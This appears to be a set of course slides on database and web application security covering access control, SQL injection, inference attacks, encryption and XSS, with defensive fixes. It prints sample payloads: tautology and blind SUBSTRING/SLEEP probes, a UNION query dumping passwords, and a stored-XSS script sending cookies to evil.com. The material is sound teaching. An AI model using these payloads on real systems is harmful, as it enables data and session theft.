01

Where is the real target?

The application is the door — the data is the treasure.

The ultimate target

DB security is an extension of application security

  • Web applications are simply an entry point.
  • The ultimate target for most attackers is the data: credentials, PII, financial records, intellectual property.
  • Poorly secured DBs often grant elevated privileges (root / admin) when exploited.
  • A compromised database enables lateral movement and persistent access across the infrastructure.
Analogy

Attacking an app is like breaking into a bank's lobby. Attacking the DB is cracking the vault directly. Which would a patient, resourceful attacker prefer? Why?

Two layers of defense

Application security vs. database security

Application security

Focuses on how the application behaves: input handling, authentication, session management, API behavior, etc.

Database security

Ensures the underlying data store cannot be compromised, abused, or misused — even if the application layer is partially bypassed.

Key

A well-secured app with a poorly secured DB is still vulnerable. Defense-in-depth requires operating at both layers simultaneously.

The CIA triad applied

CIA in the app / DB context

Principle Application layer Database layer
Confidentiality Preventing leakage of user credentials / session tokens Protecting stored data from unauthorized access
Integrity Preventing tampering of HTTP requests / parameters Preventing unauthorized modification of records or schema
Availability Defending against DoS on app endpoints Ensuring the DB remains accessible and performant under load

02

What does a secure DB need?

Five categories of security requirements.

Overview

Database security requirements

🏗️

Physical integrity

Immunity to physical catastrophes: power failures, disk failures, disasters.

🧩

Logical integrity

DB consistency and reconstructability via transaction logs.

🔍

Element integrity

Correctness of individual fields: field checks, access controls, and change logs.

📋

Auditability

Log all reads and writes with timestamp, user, and IP.

🔑

Access control & auth

Logical separation by user privileges; independent and rigorous authentication.

⚡

Availability

Support for concurrent users and reliability under production load.

Physical & logical integrity

Protecting data when things go wrong

Physical integrity

  • Physical hardware security: locked racks, access-controlled data centers.
  • UPS / backup power for outages.
  • Regular off-site backups.

Logical integrity — reconstruction

  • Maintain a transaction log of every write operation.
  • Replay the log to restore the system to a stable point after a crash.
  • Two-phase commit (2PC) ensures distributed writes are atomic.
Correct data, correct access

Element integrity, auditability & access control

Element integrity

  • Field checks: only acceptable values.
  • Access controls: only authorized users can update.
  • Change log: to undo errors.

Auditability

  • Log every read/write with timestamp, user, IP.
  • Logs must be tamper-proof.
  • Essential for incident response and compliance.

Access control

  • Logical separation by user privileges.
  • More complex than OS due to granularity, inference, and aggregation.
  • DB authentication can be independent of the OS.
Access control policies

Four models for deciding who can do what

DAC

Discretionary: the object owner grants permissions at their discretion. Flexible but error-prone.

MAC

Mandatory: policy set by the system/org, not the user. Rigid, very secure (common in military/gov).

RBAC

Role-based: permissions assigned to roles; users get roles. Scales well, reduces admin burden.

ABAC

Attribute-based: decisions combine user, resource, and environment attributes. Most flexible and expressive.

Discuss

A hospital: the on-call doctor needs access to any record in an emergency, but normally only their own patients'. Which model — or combination — fits best?

03

SQL Injection

The most prevalent database attack — and one of the most preventable.

Definition

What is SQL injection (SQLi)?

The attacker manipulates queries by injecting malicious input into SQL statements, causing the DB to execute unintended commands.
📤

Extract data

Read sensitive records, credentials, or PII without authorization.

✏️

Modify / delete

Alter or destroy records — potentially permanent damage.

🔓

Bypass auth

Log in without a valid password by manipulating the login verification query.

Attack avenues

Ways to inject malicious SQL

User input

Form fields, search bars, login screens — the most common vector.

Server variables

Manipulated HTTP headers (User-Agent, X-Forwarded-For) that get queried or stored.

Second-order injection

Data stored safely, but a later operation uses it unsanitized. Hard to detect.

Cookies

Altered cookies can change DB queries if the server uses them directly as parameters.

Physical input

Outside the web: e.g., a barcode with embedded SQL read by a warehouse scanner.

Anatomy of a SQL query

What this query actually does

SELECT userid, salary
FROM   salaries
WHERE  userid = 'jsmith'

SELECT userid, salary — choose which columns to return.

FROM salaries — name the source table.

WHERE userid = 'jsmith' — filters rows. If the ID is user-supplied, this is the injection point.

Without validation, the attacker inserts ' OR '1'='1 and the condition is always true.

◆ Activity · Tautology attack

What does this query return?

An attacker types the following into the username field:

username: ' OR '1'='1

SELECT * FROM users
WHERE username = '' OR '1'='1'
Answer

'1'='1' is always true. The WHERE never filters any row. The query returns every user in the table. If the app checks only the first result, the attacker logs in as that user — often an admin.

Three SQLi attack categories

Inband · Inferential · Out-of-band

📡

Inband

Same HTTP channel to inject and retrieve. Data appears directly in the web page. Includes:

  • Tautology (OR 1=1)
  • End-of-line comment (--)
  • Piggybacked queries (; DROP TABLE)
👁️

Inferential (blind)

No direct data transfer. Attacker observes DB behavior:

  • Response time (SLEEP(5))
  • Blank page vs. loaded page
  • Extracts data bit by bit
📤

Out-of-band (OOB)

Data exfiltrated via a different channel: the DB server makes a DNS/HTTP request to the attacker's server with data in the URL.

Debate

If an app shows only "Generic error" instead of specific DB messages, does blind SQLi disappear? Does OOB? Why or why not?

Step-by-step extraction

Blind & UNION-based SQLi: how data is actually stolen

Blind — character by character

No data on the page: the attacker asks yes/no questions and watches the response.

# booleano: ¿la 1ª letra es 'a'?
' AND SUBSTRING(password,1,1)='a' --

# tiempo: si acierta, tarda 5 s
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --

True/false (or fast/slow page) reveals each character. Repeat for every position — easily scripted.

UNION-based — all at once

If results are shown on the page, UNION appends the attacker's rows to the legitimate output.

' UNION SELECT username, password
  FROM users --

Requires matching the original query's column count and types. Dumps the whole table in one request.

Takeaway

Blind SQLi is slow but unstoppable once input reaches the query; UNION is fast when output is visible. Both are neutralized by parameterized queries.

04

Defense in depth

Three levels of protection against SQLi — and against inference.

Three defense layers

SQL injection countermeasures

Defensive coding • Parameterized queries
• Input validation
• SQL DOM
→
Detection • Signature-based
• Anomaly-based
• Code analysis
→
Run-time prevention Check queries at runtime against a model of expected queries
Golden rule

Use prepared statements with parameterized queries — the most effective SQLi defense. Never build SQL statements by concatenating user-input strings.

The most effective fix

Vulnerable vs. safe: parameterized queries

Vulnerable — string concat

query = "SELECT * FROM users"
       + " WHERE id = '"
       + userInput + "'"

Attacker controls the SQL that runs.

Safe — parameterized query

query = "SELECT * FROM users WHERE id = ?"
stmt.setString(1, userInput)

User input is always a value, never SQL code.

Why it works

The DB compiles the SQL template before user input arrives. The parameter cannot change the query structure; it is always treated as a data literal.

Caveat

Parameterization does not protect dynamic identifiers — table/column names or the ORDER BY direction (ASC/DESC) — because they are not values. Those must be validated against an allow-list. Don't over-trust the ? placeholder.

A special type of threat

Inference attack: getting secrets without directly asking for them

The concept

User has authorized access to non-sensitive data and metadata, and can infer sensitive data they should not have, by combining query results.

Classic example

You can query the average salary of a two-person department. If you already know your own salary, you easily deduce your colleague's — without directly querying it.

Debate

Statistical DBs (public health data, census) must be protected from inference. Should you block all aggregate queries? Or is there a better solution? What are the implications for data utility?

Detecting and preventing inference

Two approaches + practical defenses

During DB design

Remove inference channels before deployment by altering structure or access control. May result in overly strict controls that reduce availability.

At query time

Detect inference channel violations during the query. If a channel is detected, the query is denied or altered. Dynamic but computationally costly.

Practical defenses

( 1) Do not allow aggregate query results when the selected tuple set is too small or too large. (2) Transform data by removing identifying information: de-identification and anonymization — do carefully; re-identification attacks are real.

Last line of defense

Database encryption

  • The DB is an org's most valuable info resource, protected by multiple layers: firewalls, authentication, access control, and encryption.
  • Encryption is the last line of defense — applicable to the whole DB, table level, attribute level, or individual field.

Drawback: key management

Authorized users must have the decryption key for their data. If the key is lost, data is unrecoverable.

Drawback: inflexibility

When the DB is encrypted, efficiently searching records, indexing, and range queries become much harder.

Modern answer

Transparent Data Encryption (TDE) encrypts files at rest without changing queries, and searchable encryption lets you query over ciphertext — both ease the inflexibility problem.

What changed 2021 → 2025

A05: Injection — XSS

Cross-Site Scripting (XSS)

XSS occurs when an application takes in malicious user input that inadvertently executes user-supplied code — in the victim's browser.
Key diff from SQLi

In SQLi the attacker targets the DB server. In XSS they plant code on the web server that then executes in other people's browsers. The server is the middleman — the users are the victims.

  • Steal session cookies and hijack the user's session.
  • Redirect the user to a fraudulent phishing page.
  • Install a keylogger or download malware onto the victim's machine.
Three main types of XSS

Stored · Reflected · DOM-based XSS

Stored (persistent) XSS

Malicious script is saved on the server (e.g., forum, comment box, user profile). Any subsequent visitor runs the script — without doing anything special.

Example: attacker posts <script>location.href='evil.com?c='+document.cookie</script> in a forum.

Reflected (non-persistent) XSS

Script is not stored; embedded in a malicious URL sent to the victim. Requires the victim to click the link (e.g., phishing email).

Delivery: phishing email with a link containing the XSS payload in the URL parameter.

DOM-based XSS (client-side)

The payload never reaches the server: the site's own JavaScript reads attacker-controlled data (e.g. location.hash) and writes it to a dangerous sink like innerHTML or document.write, executing it in the browser.

Highly relevant in modern SPAs: with no server round-trip, server-side filters never see it.

Debate

Stored XSS affects all future visitors with no action on their part. Reflected XSS requires the victim to click. Which is more dangerous? And which is more likely to go undetected longer?

How a stored XSS attack propagates

The bike forum attack — step by step

Attacker posts script in forum<script>...</script>
→
Server stores scriptin DB, unsanitized
→
Victim visits pageserver returns script in HTML
→
Script runs in victim's browsercookie theft · redirect · malware
Why it works

The browser trusts HTML/JS it receives from the server. If the server returns malicious code as part of the page, the browser has no way to know it isn't legitimate — it all appears to come from the trusted site.

XSS mitigation

Input validation + output encoding + CSP

✅

Input validation

Reject inputs containing script/HTML tags. Golden rule: all input is evil until proven otherwise.

🔤

Output encoding

When displaying user data, encode HTML special chars: < → &lt;. The browser displays text — doesn't execute it.

🛡️

CSP

Content Security Policy tells the browser which script sources are allowed. Acts as a safety net even if XSS slips through.

Server vs. client side

For stored XSS: sanitize inputs on the server before saving. For reflected XSS: client-side validation helps, but the server must also validate — never trust the client alone.

Vulnerable vs. fixed

Output encoding in code: the XSS pattern

Vulnerable
// reflexión cruda — el HTML del atacante se ejecuta
echo "<div>" . $_GET['name'] . "</div>";

If name is <script>…</script>, the browser runs it.

Fixed
// codifica la salida — se muestra como texto
echo "<div>" . htmlspecialchars($_GET['name'], ENT_QUOTES) . "</div>";

Modern templating engines (Twig, React, Jinja) auto-escape output for you.

# Defensa en profundidad: una cabecera HTTP que limita qué scripts pueden ejecutarse
Content-Security-Policy: default-src 'self'; script-src 'self'
Encoding vs. validation

Input validation rejects malformed data at the door, but valid data can still contain dangerous characters. Output encoding is the primary XSS defense: it neutralizes characters right where they are rendered, per context (HTML, attribute, JS, URL).

Summary

Database & application security, in one slide

  • Web apps are entry points — the DB is the real target. Defense must operate at both layers.
  • DB security requirements span five areas: physical, logical, and element integrity, auditability, and access control.
  • SQLi can be nearly eliminated with parameterized queries. Input validation and run-time prevention add extra layers.
  • XSS remains a top-tier web attack. Input validation, output encoding, and CSP are the main defenses.
  • The OWASP Top 10:2025 is the industry-standard reference — Injection dropped to A05, yet SQLi is still the #1 web vulnerability per the Verizon DBIR.
  • Real-world case: the MOVEit Transfer SQLi (CVE-2023-34362, Cl0p, 2023) — one vulnerability that cascaded into thousands of organizations.
Hands-on

To absorb remaining time, practice on free SQLi & XSS labs: PortSwigger Web Security Academy or DVWA (Damn Vulnerable Web Application).

◆ Closing debate

Is input validation enough?

An application validates and escapes all user inputs at every layer. Yet a breach still occurs. How could that be possible?

Possible answers

• Second-order injection: data stored safely, used unsafely later. • Attacker bypasses the app layer entirely (stolen DB credentials, exposed admin console). • Inference attacks: no injection, just legitimate queries combined. • Third-party dependency vulnerabilities (your ORM library has a bug). • Misconfiguration: the DB has excessive network access or weak credentials.
